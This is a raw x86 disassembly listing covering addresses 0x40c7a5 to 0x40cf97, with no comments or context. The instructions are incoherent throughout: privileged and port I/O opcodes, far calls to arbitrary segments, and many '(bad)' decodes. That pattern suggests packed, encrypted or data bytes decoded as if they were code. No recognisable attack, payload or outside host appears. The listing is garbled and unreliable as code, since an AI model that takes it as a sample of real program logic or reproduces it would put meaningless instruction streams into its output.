  40c7a5:	mov    ebx,0xc8c47a5c
  40c7aa:	sub    dl,BYTE PTR [ecx-0xf]
  40c7ad:	rcl    BYTE PTR [esi-0x21],1
  40c7b0:	mov    edi,DWORD PTR ds:0x99f9c993
  40c7b6:	iret   
  40c7b7:	sub    al,0x5
  40c7b9:	je     0x40c7de
  40c7bb:	stos   DWORD PTR es:[edi],eax
  40c7bc:	aad    0xa4
  40c7be:	jbe    0x40c7a9
  40c7c0:	jmp    0x40c75c
  40c7c2:	push   ecx
  40c7c3:	and    esp,edi
  40c7c5:	mov    ds:0xfdeced39,eax
  40c7ca:	cmp    BYTE PTR [ecx+0x1b],ch
  40c7cd:	scas   al,BYTE PTR es:[edi]
  40c7ce:	sbb    dl,ah
  40c7d0:	test   al,0x88
  40c7d2:	call   0x964a1e79
  40c7d7:	dec    eax
  40c7d8:	stos   BYTE PTR es:[edi],al
  40c7d9:	shr    BYTE PTR [edi+0x53],0x37
  40c7dd:	addr16 inc esi
  40c7df:	sahf   
  40c7e0:	mov    ebp,0x8791ed6e
  40c7e5:	push   ds
  40c7e6:	int3   
  40c7e7:	push   esp
  40c7e8:	push   edi
  40c7e9:	rol    BYTE PTR [edi+edx*4],0x68
  40c7ed:	sbb    DWORD PTR [edi+0x69],ebx
  40c7f0:	ins    DWORD PTR es:[edi],dx
  40c7f1:	sbb    DWORD PTR [ecx+eax*2+0xdb71d27],edi
  40c7f8:	or     DWORD PTR [eax],esi
  40c7fa:	jecxz  0x40c781
  40c7fc:	lock pop ebx
  40c7fe:	mov    ch,0xb
  40c800:	jo     0x40c843
  40c802:	adc    DWORD PTR [ebx+0x29],0xdb8cc67b
  40c809:	pop    ecx
  40c80a:	xchg   eax,ecx
  40c80c:	lahf   
  40c80d:	mov    esp,0x2c64102c
  40c812:	call   0xf8c8:0xa7983b18
  40c819:	call   0x52d4ccc4
  40c81e:	lea    esi,[esp+ecx*1-0x6d]
  40c822:	ror    DWORD PTR [eax-0x72],1
  40c825:	fdiv   DWORD PTR [edx]
  40c827:	repz pop ss
  40c829:	inc    edx
  40c82a:	jge    0x40c85b
  40c82c:	shl    BYTE PTR [ebx+0x24ddcb8a],0x91
  40c833:	ins    BYTE PTR es:[edi],dx
  40c834:	and    al,0xd6
  40c836:	jno    0x40c7c4
  40c838:	xor    ebx,DWORD PTR [ecx]
  40c83a:	add    ebp,DWORD PTR [edx+0x21]
  40c83d:	out    dx,al
  40c83e:	mov    bh,0xdd
  40c840:	rcr    BYTE PTR [eax+eax*2+0x1acd9d5a],0xec
  40c848:	jmp    0x10cb472c
  40c84d:	stos   DWORD PTR es:[edi],eax
  40c84e:	les    edi,FWORD PTR ds:0x47f48804
  40c854:	sub    DWORD PTR [ecx],esp
  40c856:	xchg   edi,eax
  40c858:	push   eax
  40c859:	mov    ebx,0xcf8f26ab
  40c85e:	add    DWORD PTR [edx-0x543c8cef],esp
  40c864:	jb     0x40c857
  40c866:	iret   
  40c867:	rol    BYTE PTR [ecx-0x7a],cl
  40c86a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c86b:	les    esi,FWORD PTR [edx-0x66425f15]
  40c871:	jae    0x40c86a
  40c873:	jno    0x40c8f0
  40c875:	inc    ebp
  40c876:	es fs push ebp
  40c879:	shr    eax,0x1c
  40c87c:	xor    eax,0xfad9b588
  40c881:	test   al,0xf4
  40c883:	inc    eax
  40c884:	add    DWORD PTR [eax+0x2c],0xa84894c8
  40c88b:	out    0x97,eax
  40c88d:	mov    ch,0xd3
  40c88f:	mov    al,0xab
  40c891:	sbb    al,0x3
  40c893:	pop    edi
  40c894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c895:	leave  
  40c896:	lock add ch,bl
  40c899:	jmp    0x2e3:0x19d0250e
  40c8a0:	mov    eax,ds:0xb51f8ad4
  40c8a5:	cwde   
  40c8a6:	mov    ah,BYTE PTR [eax-0x41]
  40c8a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8aa:	arpl   WORD PTR [edx+0x79],sp
  40c8ad:	mov    ebx,0x1ccdea32
  40c8b2:	dec    edx
  40c8b3:	call   0xe09c:0x655716c6
  40c8ba:	push   ebp
  40c8bb:	cmc    
  40c8bc:	mov    cl,0x4f
  40c8be:	int    0x57
  40c8c0:	xor    al,0x61
  40c8c2:	jg     0x40c912
  40c8c4:	jg     0x40c89a
  40c8c6:	out    dx,eax
  40c8c7:	(bad)  
  40c8c9:	in     eax,dx
  40c8ca:	mov    ds:0xaada3055,al
  40c8cf:	jp     0x40c8ab
  40c8d1:	mov    edx,0xe8360665
  40c8d6:	into   
  40c8d7:	pop    esi
  40c8d8:	pop    ds
  40c8d9:	clc    
  40c8da:	push   ebp
  40c8db:	lahf   
  40c8dc:	enter  0x98cc,0x12
  40c8e0:	cwde   
  40c8e1:	cmp    al,BYTE PTR [eax-0x18]
  40c8e4:	iret   
  40c8e5:	adc    esi,eax
  40c8e7:	scas   eax,DWORD PTR es:[edi]
  40c8e8:	js     0x40c8a0
  40c8ea:	cmp    BYTE PTR [edi+0x5513a5f0],0x1f
  40c8f1:	iret   
  40c8f2:	cli    
  40c8f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8f4:	ins    DWORD PTR es:[edi],dx
  40c8f5:	push   edi
  40c8f6:	add    DWORD PTR [eax],edi
  40c8f8:	out    0x2a,al
  40c8fa:	cmp    BYTE PTR [edx+0x4ffa26b4],dl
  40c900:	dec    edx
  40c901:	jmp    0x3b5486f
  40c906:	pushf  
  40c907:	sbb    DWORD PTR [ebx+0x2ea59df9],edx
  40c90d:	(bad)  
  40c90e:	jl     0x40c950
  40c910:	loopne 0x40c923
  40c912:	stc    
  40c913:	add    cl,bl
  40c915:	cmp    eax,0x632964e2
  40c91a:	daa    
  40c91b:	mov    ecx,0x64315353
  40c920:	addr16 push es
  40c922:	call   0xa7098716
  40c927:	call   0x7260:0xe73fcab4
  40c92e:	pusha  
  40c92f:	fwait
  40c930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c931:	mov    gs,WORD PTR [eax]
  40c933:	jnp    0x40c976
  40c935:	retf   0x6449
  40c938:	addr16 sub al,0x90
  40c93b:	xor    BYTE PTR [eax-0x5],0x48
  40c93f:	inc    edi
  40c940:	out    0xd3,eax
  40c942:	ret    
  40c943:	and    dh,0x46
  40c946:	dec    ecx
  40c947:	or     bh,bl
  40c949:	jae    0x40c999
  40c94b:	test   al,0x9f
  40c94d:	mov    esp,cs
  40c94f:	jle    0x40c922
  40c951:	xchg   ebx,eax
  40c952:	int3   
  40c953:	xchg   ecx,eax
  40c954:	cld    
  40c955:	(bad)  [eax]
  40c957:	jg     0x40c9c7
  40c959:	iret   
  40c95a:	add    eax,DWORD PTR [edi+eiz*8-0x285b729f]
  40c961:	mov    edx,0x65a5d545
  40c966:	mov    esi,0xc2ec1035
  40c96b:	adc    BYTE PTR [ebp-0x46a61a97],cl
  40c971:	or     BYTE PTR [ebx],ch
  40c973:	pop    DWORD PTR [esi+0x2b]
  40c976:	mov    bh,0x6f
  40c978:	xor    al,0x7d
  40c97a:	sub    al,0xc3
  40c97c:	(bad)  
  40c97d:	call   0x71db:0xa10f5c2d
  40c984:	je     0x40c924
  40c986:	jg     0x40c916
  40c988:	xor    cl,BYTE PTR [esi]
  40c98a:	mov    ds:0x532c4f8f,al
  40c98f:	in     al,0x86
  40c991:	push   ebp
  40c992:	cmp    ebx,edi
  40c994:	int    0xc2
  40c996:	or     eax,0xbd45d98e
  40c99b:	test   al,0xe9
  40c99d:	pop    esp
  40c99e:	push   ds
  40c99f:	gs pop es
  40c9a1:	scas   eax,DWORD PTR es:[edi]
  40c9a2:	sbb    al,0x92
  40c9a4:	mov    ah,0xb9
  40c9a6:	popa   
  40c9a7:	jl     0x40c974
  40c9a9:	pusha  
  40c9aa:	cmp    DWORD PTR [eax],0xeb5565e0
  40c9b0:	jge    0x40ca26
  40c9b2:	mov    dh,0x95
  40c9b4:	inc    ecx
  40c9b5:	cld    
  40c9b6:	jmp    0x37db:0x68480b39
  40c9bd:	or     dl,dl
  40c9bf:	imul   esp,eax,0x65a62862
  40c9c5:	jns    0x40ca2b
  40c9c7:	call   0xb0ec:0xce7d87a8
  40c9ce:	pop    edx
  40c9cf:	es dec eax
  40c9d1:	add    DWORD PTR [ebp+0x5b],ebx
  40c9d4:	jle    0x40c992
  40c9d6:	xchg   esp,eax
  40c9d7:	into   
  40c9d8:	mov    eax,0x947fadda
  40c9dd:	es daa 
  40c9df:	bound  edi,QWORD PTR [edx-0x31216bf4]
  40c9e5:	fwait
  40c9e6:	sbb    ah,BYTE PTR [edx]
  40c9e8:	sub    BYTE PTR [esi-0x518dd7fb],cl
  40c9ee:	pusha  
  40c9ef:	mov    cl,dl
  40c9f1:	leave  
  40c9f2:	push   ds
  40c9f3:	push   cs
  40c9f4:	sbb    cl,BYTE PTR [edi-0x66d4fae1]
  40c9fa:	loopne 0x40c984
  40c9fc:	in     al,0xe2
  40c9fe:	add    esi,DWORD PTR [ebp+0x41c1ee35]
  40ca04:	and    DWORD PTR [eax+0x19],ecx
  40ca07:	mov    ecx,0xab9b102c
  40ca0c:	xlat   BYTE PTR ds:[ebx]
  40ca0d:	sti    
  40ca0e:	mov    ch,0x69
  40ca10:	(bad)  
  40ca11:	ja     0x40ca83
  40ca13:	and    DWORD PTR [ecx-0x8b2dfc3],ebx
  40ca19:	sub    ebx,DWORD PTR [ebx+0x73feb629]
  40ca1f:	das    
  40ca20:	jge    0x40c9a3
  40ca22:	xchg   esi,eax
  40ca23:	mov    dl,0xdb
  40ca25:	cwde   
  40ca26:	and    edi,DWORD PTR [esi+0x48f95356]
  40ca2c:	and    edx,ecx
  40ca2e:	stos   BYTE PTR es:[edi],al
  40ca2f:	and    al,0x49
  40ca31:	mov    eax,ds:0x8510821d
  40ca36:	leave  
  40ca37:	mov    dh,BYTE PTR [ebp-0x6f1376c7]
  40ca3d:	shl    BYTE PTR [esi-0x5ff31c56],0xe1
  40ca44:	add    eax,0x17cc3a50
  40ca49:	xchg   ecx,eax
  40ca4a:	dec    esi
  40ca4b:	add    dl,BYTE PTR [eax-0x72320835]
  40ca51:	pop    esi
  40ca52:	dec    esp
  40ca53:	push   eax
  40ca54:	pop    ebp
  40ca55:	icebp  
  40ca56:	rcl    DWORD PTR [edi+0x5e798531],0xbf
  40ca5d:	div    BYTE PTR [esi]
  40ca5f:	repnz mov dl,BYTE PTR [ebx+0x297e293c]
  40ca66:	sbb    al,0x79
  40ca68:	icebp  
  40ca69:	std    
  40ca6a:	adc    al,0x34
  40ca6c:	(bad)  [eax+ecx*2]
  40ca6f:	jl     0x40ca75
  40ca71:	dec    ebp
  40ca72:	shr    DWORD PTR [ebp-0x2e09caf1],cl
  40ca78:	ds push es
  40ca7a:	mov    edi,0xa46e714d
  40ca7f:	data16 js 0x40ca96
  40ca82:	loopne 0x40ca16
  40ca84:	popf   
  40ca85:	out    0xd5,al
  40ca87:	mov    edi,esi
  40ca89:	sub    al,0xd1
  40ca8b:	xchg   ebp,eax
  40ca8c:	xor    ecx,DWORD PTR [edx*4+0x3ca86cb7]
  40ca93:	popa   
  40ca94:	push   ebx
  40ca95:	inc    edi
  40ca96:	call   0xe62e:0xfe3f9aae
  40ca9d:	add    al,BYTE PTR [edi]
  40ca9f:	sbb    eax,0x28695db0
  40caa4:	lds    esi,FWORD PTR [esi]
  40caa6:	push   cs
  40caa7:	arpl   WORD PTR [edi+0x1f685b45],dx
  40caad:	cli    
  40caae:	test   BYTE PTR [eax-0xc3c7749],bl
  40cab4:	xchg   DWORD PTR [ebx],edx
  40cab6:	dec    esp
  40cab7:	stos   BYTE PTR es:[edi],al
  40cab8:	xor    al,0x83
  40caba:	mov    edi,0xc552f099
  40cabf:	push   es
  40cac0:	adc    edx,DWORD PTR [edx-0x5fa7d71f]
  40cac6:	dec    eax
  40cac7:	jmp    0x6c2ee36
  40cacc:	xor    eax,0xc768f8de
  40cad1:	test   eax,0x797eb59a
  40cad6:	inc    ecx
  40cad7:	ret    0xfd17
  40cada:	(bad)  
  40cadb:	out    dx,al
  40cadc:	dec    esi
  40cadd:	jmp    eax
  40cadf:	(bad)  
  40cae0:	mov    ebp,0xae496f21
  40cae5:	jnp    0x40cb48
  40cae7:	xor    al,0xec
  40cae9:	xchg   edx,eax
  40caea:	add    ah,al
  40caec:	pop    ebx
  40caed:	icebp  
  40caee:	in     al,0x46
  40caf0:	call   0xcd28ed50
  40caf5:	xor    DWORD PTR [edi-0x9],edi
  40caf8:	loope  0x40cb63
  40cafa:	and    BYTE PTR [ebx-0x3d],bl
  40cafd:	bound  ebx,QWORD PTR [ecx+ebp*8-0x265c126b]
  40cb04:	iret   
  40cb05:	pusha  
  40cb06:	(bad)  
  40cb07:	mov    WORD PTR ds:0x27f6e95a,es
  40cb0d:	stos   DWORD PTR es:[edi],eax
  40cb0e:	aas    
  40cb0f:	xchg   esi,eax
  40cb10:	add    al,0x8
  40cb12:	imul   esp,DWORD PTR [ecx-0x3d],0x3e
  40cb16:	push   0xd0ddfa01
  40cb1b:	push   es
  40cb1c:	pop    eax
  40cb1d:	jg     0x40cadb
  40cb1f:	stc    
  40cb20:	push   ds
  40cb21:	leave  
  40cb22:	fs push ecx
  40cb24:	cmp    eax,0x2d167ddc
  40cb29:	push   ebp
  40cb2a:	cmc    
  40cb2b:	sub    ebx,ebx
  40cb2d:	jecxz  0x40cb65
  40cb2f:	mov    edi,0xe9646117
  40cb34:	fldcw  WORD PTR [eax+0x7b]
  40cb37:	jb     0x40cb7a
  40cb39:	mov    ebx,DWORD PTR [ebp-0x4c4c9535]
  40cb3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb40:	ja     0x40cb17
  40cb42:	xor    eax,0x304089ed
  40cb47:	xor    eax,edi
  40cb49:	cmp    DWORD PTR ss:[ebp+0x60],eax
  40cb4d:	pop    edx
  40cb4e:	stc    
  40cb4f:	inc    ebx
  40cb50:	cld    
  40cb51:	mov    cl,0x5
  40cb53:	int3   
  40cb54:	cmp    al,0xe1
  40cb56:	pop    eax
  40cb57:	scas   al,BYTE PTR es:[edi]
  40cb58:	dec    edi
  40cb59:	push   esi
  40cb5a:	fld    TBYTE PTR [edi+ebp*8]
  40cb5d:	cmp    BYTE PTR [eax+0x2f],al
  40cb60:	add    eax,0x46ac02d5
  40cb65:	(bad)  
  40cb66:	cmp    eax,DWORD PTR [edi+0x9]
  40cb69:	mov    bh,0xb6
  40cb6b:	cmc    
  40cb6c:	jge    0x40cba4
  40cb6e:	(bad)
  40cb71:	dec    ecx
  40cb72:	es or  esp,ecx
  40cb75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb76:	mov    DWORD PTR [ebx+0x61],ecx
  40cb79:	add    eax,0x6b
  40cb7c:	mov    eax,0xe3b93496
  40cb81:	fst    DWORD PTR [ecx-0x5f8326f4]
  40cb87:	push   ds
  40cb88:	push   edx
  40cb89:	sub    esp,esi
  40cb8b:	mov    ecx,0xeceb6b05
  40cb90:	fucomi st,st(7)
  40cb92:	mov    al,0xab
  40cb94:	pop    es
  40cb95:	sbb    edx,DWORD PTR [ecx-0x4b]
  40cb98:	out    0xb9,eax
  40cb9a:	lods   eax,DWORD PTR ds:[esi]
  40cb9b:	sahf   
  40cb9c:	jae    0x40cc0d
  40cb9e:	cmp    ah,ch
  40cba0:	cmp    al,bh
  40cba2:	ins    BYTE PTR es:[edi],dx
  40cba3:	xchg   esi,ecx
  40cba5:	cmp    DWORD PTR [ecx+ebp*2+0x73],0xf711d691
  40cbad:	mov    dh,0xf6
  40cbaf:	push   ss
  40cbb0:	pop    ss
  40cbb1:	pop    ds
  40cbb2:	js     0x40cb3e
  40cbb4:	enter  0xed0,0xf6
  40cbb8:	add    al,0xfc
  40cbba:	shr    BYTE PTR ds:[di-0x7e1d],0xa8
  40cbc1:	push   0x1c
  40cbc3:	pop    esp
  40cbc4:	jp     0x40cb4d
  40cbc6:	pop    ds
  40cbc7:	cwde   
  40cbc8:	sub    edi,ebx
  40cbca:	dec    ebx
  40cbcb:	mov    al,0xba
  40cbcd:	inc    eax
  40cbce:	daa    
  40cbcf:	xor    bh,BYTE PTR [ecx+0x57]
  40cbd2:	pop    ss
  40cbd3:	fdivr  QWORD PTR [eax]
  40cbd5:	scas   eax,DWORD PTR es:[edi]
  40cbd6:	sub    dl,al
  40cbd8:	sahf   
  40cbd9:	lods   eax,DWORD PTR ds:[esi]
  40cbda:	jnp    0x40cc21
  40cbdc:	push   ebx
  40cbdd:	sub    BYTE PTR [esi-0x6],0xbb
  40cbe1:	mov    al,0x21
  40cbe3:	cmp    al,0x70
  40cbe5:	xchg   edi,eax
  40cbe6:	dec    edx
  40cbe7:	pop    es
  40cbe8:	mov    ebp,0xf5705903
  40cbed:	cmp    esi,DWORD PTR ds:0x1239083a
  40cbf3:	enter  0x6f84,0x58
  40cbf7:	adc    eax,0xe28cd91f
  40cbfc:	inc    edi
  40cbfd:	pushf  
  40cbfe:	mov    WORD PTR [eax+ebx*4-0x2a],?
  40cc02:	out    dx,eax
  40cc03:	repz pop ebx
  40cc05:	aam    0x9f
  40cc07:	mov    bh,0x4a
  40cc09:	cmp    DWORD PTR [edi-0x55],ebp
  40cc0c:	add    al,0xd1
  40cc0e:	pop    ss
  40cc0f:	xlat   BYTE PTR ds:[ebx]
  40cc10:	inc    edx
  40cc11:	jae    0x40cc20
  40cc13:	xchg   BYTE PTR [eax+0x35fbc715],ah
  40cc19:	(bad)  
  40cc1a:	xchg   ecx,eax
  40cc1b:	call   0xaa43179c
  40cc20:	pop    esp
  40cc21:	pop    eax
  40cc22:	ja     0x40cc43
  40cc24:	xor    eax,0xe163760
  40cc29:	enter  0xce8e,0x7b
  40cc2d:	popa   
  40cc2e:	mov    ds:0x9b14b8ea,eax
  40cc33:	sbb    al,0xa9
  40cc35:	add    DWORD PTR [ecx-0xb8f6a2c],esp
  40cc3b:	cmc    
  40cc3c:	cmp    bh,cl
  40cc3e:	mov    dh,0x53
  40cc40:	inc    esp
  40cc41:	sub    BYTE PTR [eax],0x14
  40cc44:	and    BYTE PTR [edx-0x69495e85],0x4c
  40cc4b:	pop    eax
  40cc4c:	adc    DWORD PTR [esp+edx*8+0x2c074f22],0xffffffa3
  40cc54:	ds nop
  40cc56:	sub    eax,0x954910a3
  40cc5b:	dec    ebp
  40cc5c:	outs   dx,DWORD PTR ds:[esi]
  40cc5d:	sub    BYTE PTR [edx-0xa9d8be9],ah
  40cc63:	pop    ebx
  40cc64:	outs   dx,BYTE PTR ds:[esi]
  40cc65:	(bad)  
  40cc66:	sub    al,0x9e
  40cc68:	ret    
  40cc69:	sub    eax,0x70397644
  40cc6e:	lods   eax,DWORD PTR ds:[esi]
  40cc6f:	dec    edx
  40cc70:	push   ecx
  40cc71:	mov    BYTE PTR [edx-0x35d91f8a],bh
  40cc77:	sub    bx,WORD PTR [ecx-0x67]
  40cc7b:	push   ebp
  40cc7c:	loopne 0x40ccd7
  40cc7e:	push   ebx
  40cc7f:	test   al,0xf6
  40cc81:	pop    esp
  40cc82:	pop    ds
  40cc83:	mov    al,0x95
  40cc85:	aaa    
  40cc86:	inc    eax
  40cc87:	ror    DWORD PTR [ecx-0x84d3fe0],0xe2
  40cc8e:	inc    esi
  40cc8f:	jmp    0x40ccf1
  40cc91:	jns    0x40cc65
  40cc93:	mov    es,WORD PTR [edx]
  40cc95:	bound  ebx,QWORD PTR [eax+eax*1+0x0]
	...
  40cd14:	xor    eax,0xf69202c1
  40cd19:	shl    DWORD PTR [ebp+0x29d829e7],cl
  40cd1f:	scas   eax,DWORD PTR es:[edi]
  40cd20:	dec    sp
  40cd22:	(bad)  
  40cd23:	cld    
  40cd24:	push   0x7c
  40cd26:	add    BYTE PTR [eax],al
  40cd28:	imul   eax,DWORD PTR [edi],0x0
  40cd2b:	add    BYTE PTR [eax-0x25],bh
  40cd2e:	aad    0xd1
  40cd30:	imul   edi,ebp,0x956eb2f7
  40cd36:	xchg   DWORD PTR [esi-0x6d],ebx
  40cd39:	sbb    dl,BYTE PTR [ebx+0x73cf0cc1]
  40cd3f:	jbe    0x40cdb6
  40cd41:	xchg   BYTE PTR [edi-0x54bcc59b],dh
  40cd47:	push   edi
  40cd48:	dec    ecx
  40cd49:	in     al,dx
  40cd4a:	push   cs
  40cd4b:	pop    ebx
  40cd4c:	(bad)  
  40cd4d:	js     0x40ccf0
  40cd4f:	nop
  40cd50:	and    cl,BYTE PTR [edx]
  40cd52:	mov    edx,0xc3722ad7
  40cd57:	xor    cl,BYTE PTR gs:[esi-0x5d]
  40cd5b:	and    al,0xfd
  40cd5d:	push   cs
  40cd5e:	pop    edx
  40cd5f:	xor    al,0x97
  40cd61:	pop    ebx
  40cd62:	jecxz  0x40cda1
  40cd64:	adc    eax,ebp
  40cd66:	push   esp
  40cd67:	test   BYTE PTR [esp+ebx*8+0x33d73e3d],al
  40cd6e:	or     BYTE PTR [ebx+0x2063e5c],ah
  40cd74:	or     dl,BYTE PTR [edx+0x70]
  40cd77:	fisttp DWORD PTR [ebp-0x7a]
  40cd7a:	add    ch,bl
  40cd7c:	mov    bh,0x91
  40cd7e:	nop
  40cd7f:	jl     0x40cd11
  40cd81:	std    
  40cd82:	push   es
  40cd83:	retf   0x25af
  40cd86:	lods   eax,DWORD PTR ds:[esi]
  40cd87:	xor    al,0xbb
  40cd89:	add    eax,0x2038e3e1
  40cd8e:	inc    ebp
  40cd8f:	sahf   
  40cd90:	ret    0x4284
  40cd93:	push   ecx
  40cd94:	bnd jns 0x40cd2d
  40cd97:	stos   DWORD PTR es:[edi],eax
  40cd98:	xor    al,0xf9
  40cd9a:	mov    ds:0x9a1faf39,al
  40cd9f:	int    0x48
  40cda1:	mov    DWORD PTR [edi-0xc6f59f9],ebp
  40cda7:	shl    DWORD PTR [ebp+0x17],1
  40cdaa:	push   ds
  40cdab:	clc    
  40cdac:	xor    ebp,DWORD PTR [eax+0x33]
  40cdaf:	jbe    0x40ce06
  40cdb1:	daa    
  40cdb2:	aad    0x50
  40cdb4:	and    DWORD PTR [edi+0x86b9646],ecx
  40cdba:	enter  0xb191,0xb6
  40cdbe:	out    0x7d,al
  40cdc0:	mov    cl,BYTE PTR [edx]
  40cdc2:	xor    eax,0xbb2b040b
  40cdc7:	mov    edi,0xc040e210
  40cdcc:	add    BYTE PTR [esi],0x57
  40cdcf:	sbb    dl,BYTE PTR [esi]
  40cdd1:	sbb    al,0xba
  40cdd3:	xchg   esp,ecx
  40cdd5:	loop   0x40ce12
  40cdd7:	shl    DWORD PTR [ebp+0x7d162960],cl
  40cddd:	mov    ds:0x6bc06d86,al
  40cde2:	inc    edi
  40cde3:	les    esi,FWORD PTR [edi-0x31]
  40cde6:	mov    al,0x7a
  40cde8:	scas   eax,DWORD PTR es:[edi]
  40cde9:	pop    ebp
  40cdea:	pushf  
  40cdeb:	rcr    DWORD PTR [ebp-0x244f13b6],0xa7
  40cdf2:	cld    
  40cdf3:	test   esp,eax
  40cdf5:	mov    DWORD PTR [esi],edx
  40cdf7:	fist   DWORD PTR [ecx-0x59]
  40cdfa:	js     0x40cdf9
  40cdfc:	jp     0x40ce36
  40cdfe:	out    dx,al
  40cdff:	sub    DWORD PTR [edx],ebp
  40ce01:	mov    esi,0x5184237b
  40ce06:	repz jp 0x40cdf6
  40ce09:	cld    
  40ce0a:	mov    ah,0xb0
  40ce0c:	dec    edx
  40ce0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce0e:	(bad)  
  40ce0f:	push   edx
  40ce10:	fsub   DWORD PTR [eax+0x4f]
  40ce13:	inc    ebp
  40ce14:	pop    ss
  40ce15:	cmp    eax,0xb7ab1358
  40ce1a:	in     eax,0x4f
  40ce1c:	sbb    BYTE PTR [eax-0x44310c42],al
  40ce22:	jmp    0x40ce63
  40ce24:	add    DWORD PTR [ecx+edx*4-0x30],esi
  40ce28:	shl    BYTE PTR [edi+0x5c],1
  40ce2b:	imul   esi,DWORD PTR [eax+0x269fa9f0],0xeb22fa07
  40ce35:	cmp    cl,BYTE PTR [eax]
  40ce37:	inc    edx
  40ce38:	jmp    0x40cdf9
  40ce3a:	and    BYTE PTR ss:[esp+ecx*4],al
  40ce3e:	stos   DWORD PTR es:[edi],eax
  40ce3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce40:	shl    BYTE PTR [esi-0x34],0x64
  40ce44:	mov    DWORD PTR [ebx],esi
  40ce46:	fistp  WORD PTR [ebp-0x77aa0258]
  40ce4c:	mov    bl,0x9
  40ce4e:	mov    edx,edi
  40ce50:	push   ebx
  40ce51:	sub    BYTE PTR [edx+0x24],bl
  40ce54:	psubusb mm1,QWORD PTR [ebx+ebx*1-0x42]
  40ce59:	mov    edi,0xa836ffbc
  40ce5e:	aam    0x7c
  40ce60:	cmp    DWORD PTR ds:0x2220b4d3,edi
  40ce66:	pop    ss
  40ce67:	push   eax
  40ce68:	mov    dl,0x92
  40ce6a:	mov    ebp,0x1de80e40
  40ce6f:	mov    BYTE PTR [edi+edx*4+0x10c8053b],dh
  40ce76:	or     ch,BYTE PTR [edx+0x59e90f54]
  40ce7c:	sub    bl,BYTE PTR [edx-0x1dd253d0]
  40ce82:	in     eax,0xf0
  40ce84:	outs   dx,DWORD PTR ds:[esi]
  40ce85:	dec    esi
  40ce86:	push   edx
  40ce87:	sub    dl,BYTE PTR [esi]
  40ce89:	pop    es
  40ce8a:	jmp    FWORD PTR [eax]
  40ce8c:	in     al,dx
  40ce8d:	imul   DWORD PTR [ebp+ebp*8+0xf]
  40ce91:	sbb    al,0x94
  40ce93:	fist   WORD PTR [eax-0x1d]
  40ce96:	out    dx,al
  40ce97:	add    al,0xf2
  40ce99:	stc    
  40ce9a:	or     al,BYTE PTR [ebp-0x58113fc7]
  40cea0:	mov    dl,BYTE PTR ds:0xee70ead3
  40cea6:	rol    al,0x3a
  40cea9:	sti    
  40ceaa:	xchg   BYTE PTR [edi+0x3135bf89],dh
  40ceb0:	in     eax,dx
  40ceb1:	add    edi,ebp
  40ceb3:	call   0xb969:0x729e1bab
  40ceba:	ret    0x31e3
  40cebd:	jg     0x40cf13
  40cebf:	std    
  40cec0:	and    BYTE PTR [edi-0x61cb7e5a],dh
  40cec6:	jecxz  0x40ce93
  40cec8:	loop   0x40cf37
  40ceca:	inc    esi
  40cecb:	icebp  
  40cecc:	dec    esp
  40cecd:	jmp    0x40cee6
  40cecf:	xor    dh,BYTE PTR ds:0x8f10076
  40ced5:	lods   al,BYTE PTR ds:[esi]
  40ced6:	and    ch,dh
  40ced8:	xor    al,0x40
  40ceda:	pop    esp
  40cedb:	lahf   
  40cedc:	add    bl,cl
  40cede:	push   0x3e
  40cee0:	add    DWORD PTR [edx],edi
  40cee2:	in     eax,0x70
  40cee4:	add    al,0x5
  40cee6:	jno    0x40cefb
  40cee8:	mov    WORD PTR [esi-0x2a],?
  40ceeb:	imul   esi,DWORD PTR [eax],0xd0ffc195
  40cef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cef2:	into   
  40cef3:	xor    eax,0x2a7a3370
  40cef8:	jns    0x40cf38
  40cefa:	sbb    edi,DWORD PTR [ecx]
  40cefc:	mov    ch,0x5c
  40cefe:	ins    BYTE PTR es:[edi],dx
  40ceff:	loope  0x40cf3d
  40cf01:	sbb    al,0xf1
  40cf03:	fadd   QWORD PTR [ebp-0x1a5cdf23]
  40cf09:	ror    DWORD PTR [esi+ebx*1+0x53b02c1c],1
  40cf10:	xor    esi,DWORD PTR [ecx-0x50]
  40cf13:	sbb    DWORD PTR [ecx+0x32d2bffc],eax
  40cf19:	mov    DWORD PTR [edi-0x41],ebp
  40cf1c:	jno    0x40cf29
  40cf1e:	inc    esp
  40cf1f:	mov    ch,0xf2
  40cf21:	ss pop ebp
  40cf23:	mov    esp,0xb207baf1
  40cf28:	mov    bl,0x43
  40cf2a:	cmp    eax,0xefa2d69f
  40cf2f:	mov    ebp,DWORD PTR [ebx]
  40cf31:	out    0xfe,eax
  40cf33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf34:	addr16 push edx
  40cf36:	test   BYTE PTR [edi],0x3a
  40cf39:	fnstsw WORD PTR [ecx]
  40cf3b:	cmc    
  40cf3c:	add    ah,bh
  40cf3e:	inc    ebp
  40cf3f:	xchg   BYTE PTR [edi],ch
  40cf41:	scas   eax,DWORD PTR es:[edi]
  40cf42:	or     eax,0xcfbf0d10
  40cf47:	mov    bl,0x9f
  40cf49:	sub    bl,ch
  40cf4b:	or     BYTE PTR [edi],bl
  40cf4d:	ror    ah,1
  40cf4f:	icebp  
  40cf50:	adc    dh,cl
  40cf52:	pop    eax
  40cf53:	jnp    0x40cf12
  40cf55:	mov    eax,0x36076ab7
  40cf5a:	jns    0x40cf67
  40cf5c:	mov    bh,0x68
  40cf5e:	call   0x7a89:0x33364a7c
  40cf65:	mov    edx,eax
  40cf67:	sti    
  40cf68:	sti    
  40cf69:	mov    ds:0x4c80051a,al
  40cf6e:	aad    0x80
  40cf70:	lock mov dh,0x28
  40cf73:	adc    DWORD PTR [ebx+0x70337bfa],0x206ee0f
  40cf7d:	push   ebp
  40cf7e:	sahf   
  40cf7f:	adc    DWORD PTR [ebx+0x54],esp
  40cf82:	jo     0x9bae08a4
  40cf88:	cmp    al,0x63
  40cf8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf8b:	mov    esi,0x57ffe6ef
  40cf90:	pop    es
  40cf91:	add    bl,BYTE PTR [eax-0x4160ae8b]
  40cf97:	lahf   
